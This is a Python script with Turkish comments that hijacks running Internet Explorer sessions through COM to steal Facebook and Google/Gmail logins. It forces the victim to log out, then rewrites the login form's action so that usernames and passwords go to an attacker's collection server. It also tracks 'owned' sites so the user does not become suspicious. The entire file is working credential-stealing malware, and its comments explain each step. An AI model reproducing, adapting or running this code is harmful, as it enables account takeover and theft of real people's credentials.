import win32com.client
import time
import urlparse
import urllib

data_receiver = "http://localhost:8080/" # kimlik bilgilerini hedef sitelerimizden alacak web sunucusu olarak tanimliyoruz

target_sites = {} # hedef isteler sozlugu
target_sites["www.facebook.com"] = {"logout_url" : None, # bir kullaniciyi oturumu kapatmaya zorlamak icin bir get istegi raciligiyla yeniden yonlendirebilecegimiz bir urldir
"logout_form" : "logout_form", # oturumu kapatmaya zorlayan gonderebilecegimiz bir dom ogesidir.
"login_form_index": 0, # degistirecegimiz giris formunu iceren hedef etki alaninin domsindeki gorei konumdur 
"owned" : False} # bu da hedef isteden kimlik bilgilerini zaten alip almadigimizi cunku onlari tekrar tekrar zorlarsak bu sfer kullanici suphelenir

target_sites["accounts.google.com"] = {"logout_url" : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
"logout_form" : None,
"login_form_index" : 0,
"owned" : False}

def wait_for_browser(browser):
    # wait for the browser to finish loading a page sayfa tamamen yuklenmesi icin bekler
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return


# use the same target for multiple Gmail domains
target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

clsid='{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

windows = win32com.client.Dispatch(clsid) #internet explorer sinif nesnesi ile suanda calisan tum internet explorer sekmelerine ve orneklerine erismemizi saglayan com nesnesini baslatiriz. bunlar destek yapisiydi main loopa bakalim

while True:
    for browser in windows: # bu kimlik bilgilerini almak istedigimiz siteler icin hedefimizin tarayici oturumunu izledigmizi birincil dongumuzdur. suanda calisan internet explorer nesnelerini yineleyrek basliyoruz bu modern iedeki aktif sekmeleri icerir.
        
        url = urlparse.urlparse(browser.LocationUrl)
        
        if url.hostname in target_sites: # hedefin onceden tanimlanmis sitelerimizden birini ziyaret ettigini kesfedersek, saldirimizin ana mantigini baslatabiliriz.
            
            if target_sites[url.hostname]["owned"]: # ilk adim once bu siteye saldiri yapip yapmadigimizi belirlemektir.eger once yaptiysak onu simdi yapmayiz bunu bir dezavantaji vardir kullanici bilgileirni yanlis girmisse bunu  yanlis almis oluruz.
                continue
            # if there is a URL, we can just redirect
            if target_sites[url.hostname]["logout_url"]:#hedef sitenin yonlendirebilecegimz basit bir cikis url'si olup olmadigini gormek icin test ederiz ve eger oyleyse tarayiciyi bunu yapmaya zorlariz
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser)
            else:
                # retrieve all elements in the document hedef site facebook gibi kullanicinin oturumu kapatmaya zorlamak icin bir form gondermesini gerektiriyorsa, DOM uzerinde yinelemeye baslariz ve 
                full_doc = browser.Document.all
                
                # iterate, looking for the logout form  cikis formuna kayitli html ogesi kimligini kesfettigimizde formu gonderilmeye zorlamak
                for i in full_doc:
                    try:
                        # find the logout form and submit it
                        if i.id == target_sites[url.hostname]["logout_form"]:
                            i.submit()
                            wait_for_browser(browser)
                    except:
                        pass
            # now we modify the login form kullanici giris formuna yonlendirdikten sonra kullanici adi ve parolayi kontrol ettigimiz bir sunucuya gondermek icin formun bitis noktasini degistiriyoruz ve ardindan kullancinin bir giris yapmasini bekleriz 
            try:
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.quote(browser.LocationUrl)
                browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                target_sites[url.hostname]["owned"] = True
                # hedef sitemizin ana bilgisayar adini ,kimlik bilgilerini toplayan http sunucumuzun url'sini sonuna ekleriz dikkat et. bu http sunucumuzun kimlik bilgilerini topladiktan sonra tarayicinin hangi siteye yeniden yonlendirilecegini bilmesidir.
            except:
                pass
    time.sleep(5)
    

# yukarida olan wait_for_browser fonksyionu bir tarayicnin yeni bir sayfaya gitmek veya bir sayfanin tamamen yulenmesini beklemek gibi bir islemi tmamalamasini bekelyen baist bir fonksiyondur.